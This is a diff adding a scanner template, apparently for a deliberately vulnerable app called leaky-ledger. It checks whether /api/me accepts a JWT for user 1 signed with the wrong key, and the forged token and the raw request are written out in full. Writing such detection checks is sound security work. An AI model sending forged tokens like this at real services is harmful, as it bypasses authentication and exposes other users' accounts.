@@ -1,0 +1,27 @@
+id: leaky-ledger-jwt-signature-not-verified
+
+info:
+  name: leaky-ledger - JWT signature not verified
+  author: leaky-ledger
+  severity: critical
+  description: Sends a token for user id 1 signed with a wrong key. A 200 means the signature is ignored.
+  classification:
+    cwe-id: CWE-347
+  tags: jwt,auth,api,leaky-ledger
+
+http:
+  - raw:
+      - |
+        GET /api/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.lBCAF0tuxmcSR0c4ITfTxSW9kiC98ljE-uw03voF2-M
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username":"alice"'
